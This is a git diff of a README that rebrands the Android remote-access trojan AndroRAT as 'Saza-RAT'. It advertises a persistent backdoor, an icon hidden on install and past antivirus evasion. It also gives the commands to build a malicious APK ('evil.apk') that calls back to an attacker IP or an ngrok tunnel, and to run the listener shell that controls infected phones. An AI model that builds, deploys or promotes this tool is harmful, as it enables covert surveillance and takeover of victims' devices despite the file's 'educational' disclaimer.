@@ -1,5 +1,5 @@
 **Disclaimer** : This software is meant for educational purposes only. I'm not responsible for any malicious use of the app.
-# AndroRAT 
+# Saza-RAT 
    ## Developer
 <p align="left">
   <img src="Screenshots/saza.jpg" width="150" height="150"/>
@@ -17,13 +17,13 @@
 
 AndroRAT is a tool designed to give the control of the android system remotely and retrieve informations from it. Androrat is a client/server application developed in Java Android for the client side and the Server is in Python.
 
-##### AndroRAT will work on device from Android 4.1 (Jelly Bean) to Android 9.0 (Oreo) (API 16 to API 28)
+##### Saza-RAT will work on device from Android 4.1 (Jelly Bean) to Android 9.0 (Oreo) (API 16 to API 28)
 
-> AndroRAT also works on Android 10 (Q) but some of the interpreter command will be unstable. 
+> Saza-RAT also works on Android 10 (Q) but some of the interpreter command will be unstable. 
 
 ## Screenshots
 
-* AndroRAT In Action
+* Saza-RAT In Action
 <p align="center">
   <img src="Screenshots/5.png" width="800"/>
 </p>
@@ -31,7 +31,7 @@ AndroRAT is a tool designed to give the control of the android system remotely a
 
 ------------------------------------------------------------------------------------------------------------------------------
 
-## Features of AndroRAT 
+## Features of Saza-RAT 
 * Full persistent backdoor
 * ~~Fully undetectable by any antivirus scanner [VirusTotal](https://www.virustotal.com/gui/file/e900b5d37ad8c8f79ca000b148253af04696a85fdfc245861cfb226dd86562df/detection)~~
 * Invisible icon on install
@@ -43,12 +43,12 @@ AndroRAT is a tool designed to give the control of the android system remotely a
 
 
 ## Prerequisites
-AndroRAT requires Python3 and JAVA (or Android Studio)
+Saza-RAT requires Python3 and JAVA (or Android Studio)
 
 ## Installation
 ```
-git clone https://github.com/felixwanjala001/AndroRAT.git
-cd AndroRAT
+git clone https://github.com/felixwanjala001/Saza-RAT.git
+cd Saza-RAT
 pip install -r requirements.txt
 ```
 #### Note: 
@@ -77,7 +77,7 @@ You must run Git bash with administrator privileges.
 
 ```
 Usage:
-  python3 androRAT.py --build --ngrok [flags]
+  python3 Saza-RAT.py --build --ngrok [flags]
   Flags:
     -p, --port              Attacker port number (optional by default its set to 8000)
     -o, --output            Name for the apk file (optional by default its set to "karma.apk")
@@ -86,7 +86,7 @@ Usage:
 
 ```
 Usage:
-  python3 androRAT.py --build [flags]
+  python3 Saza-RAT.py --build [flags]
   Flags:
     -i, --ip                Attacker IP address (required)
     -p, --port              Attacker port number (required)
@@ -98,7 +98,7 @@ Or you can manually build the apk by importing [Android Code](Android_Code) fold
 ### `shell` mode
 ```
 Usage:
-  python3 androRAT.py --shell [flags]
+  python3 Saza-RAT.py --shell [flags]
   Flags:
     -i, --ip                Listner IP address
     -p, --port              Listner port number
@@ -135,13 +135,13 @@ In the sh shell there are some sub commands
 ## Examples
 
 * To build the apk using ngrok which will also set the listner:
-```python3 androRAT.py --build --ngrok -o evil.apk```
+```python3 Saza-RAT.py --build --ngrok -o evil.apk```
 
 * To build the apk using desired ip and port:
-```python3 androRAT.py --build -i 192.169.x.x -p 8000 -o evil.apk```
+```python3 Saza-RAT.py --build -i 192.169.x.x -p 8000 -o evil.apk```
 
 * To get the interpreter:
-```python3 androRAT.py --shell -i 0.0.0.0 -p 8000```
+```python3 Saza-RAT.py --shell -i 0.0.0.0 -p 8000```
 
 ## Interpreter Examples
 * Generating APK
@@ -165,6 +165,6 @@ In the sh shell there are some sub commands
 
 
 ## License
-AndroRAT is licensed under MIT license take a look at the [LICENSE](LICENSE) for more information.
+Saza-RAT is licensed under MIT license take a look at the [LICENSE](LICENSE) for more information.
 
 
